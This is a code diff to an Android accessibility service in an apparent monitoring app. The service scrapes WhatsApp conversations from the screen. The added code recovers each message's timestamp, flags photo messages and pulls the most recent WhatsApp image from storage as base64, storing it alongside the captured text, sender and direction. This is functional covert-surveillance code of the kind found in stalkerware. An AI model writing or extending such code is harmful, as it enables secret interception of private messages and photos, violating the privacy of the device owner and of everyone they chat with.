@@ -7,6 +7,7 @@ import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import com.spapp.monitoring.collectors.FileManagerCollector
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WebHistoryEntry
@@ -325,6 +326,32 @@ class BlockAccessibilityService : AccessibilityService() {
                 }?.text?.toString()?.trim()
             }
 
+            fun parseBubbleTime(timeStr: String?): Long {
+                if (timeStr.isNullOrBlank()) return now
+                try {
+                    val clean = timeStr.trim().uppercase()
+                    val calendar = java.util.Calendar.getInstance()
+                    val format = if (clean.contains("AM") || clean.contains("PM")) {
+                        java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
+                    } else {
+                        java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
+                    }
+                    val parsed = format.parse(clean)
+                    if (parsed != null) {
+                        val parsedCal = java.util.Calendar.getInstance().apply { time = parsed }
+                        calendar.set(java.util.Calendar.HOUR_OF_DAY, parsedCal.get(java.util.Calendar.HOUR_OF_DAY))
+                        calendar.set(java.util.Calendar.MINUTE, parsedCal.get(java.util.Calendar.MINUTE))
+                        calendar.set(java.util.Calendar.SECOND, 0)
+                        calendar.set(java.util.Calendar.MILLISECOND, 0)
+                        if (calendar.timeInMillis > now + 300_000) {
+                            calendar.add(java.util.Calendar.DAY_OF_YEAR, -1)
+                        }
+                        return calendar.timeInMillis
+                    }
+                } catch (_: Exception) {}
+                return now
+            }
+
             if (!chatTitle.isNullOrBlank()) {
                 val msgIdList = listOf(
                     "com.whatsapp:id/message_text",
@@ -372,6 +399,29 @@ class BlockAccessibilityService : AccessibilityService() {
                         node.getBoundsInScreen(rect)
                         val isOutgoing = rect.centerX() > (screenWidth / 2)
 
+                        // Associate real bubble timestamp from parent/sibling nodes
+                        var bubbleTimeMs = now
+                        try {
+                            val parent = node.parent
+                            if (parent != null) {
+                                val siblingTexts = collectTexts(parent)
+                                val timeText = siblingTexts.firstOrNull { isTimeOrDate(it) }
+                                if (timeText != null) {
+                                    bubbleTimeMs = parseBubbleTime(timeText)
+                                }
+                            }
+                        } catch (_: Exception) {}
+
+                        // Check if message is a media photo
+                        var mediaType: String? = null
+                        var mediaPath: String? = null
+                        if (text.contains("📷") || text.contains("Photo", ignoreCase = true) || text.contains("View photo", ignoreCase = true)) {
+                            mediaType = "image"
+                            try {
+                                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
+                            } catch (_: Exception) {}
+                        }
+
                         val dedupeKey = "$chatTitle|$text|$isOutgoing"
                         if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
                         capturedWhatsAppMsgHashes.add(dedupeKey)
@@ -384,7 +434,9 @@ class BlockAccessibilityService : AccessibilityService() {
                             sender = if (isOutgoing) "me" else chatTitle,
                             messageText = text,
                             isOutgoing = isOutgoing,
-                            messageTimeEpochMs = now
+                            messageTimeEpochMs = bubbleTimeMs,
+                            mediaType = mediaType,
+                            mediaPath = mediaPath
                         )
                     }
                 }
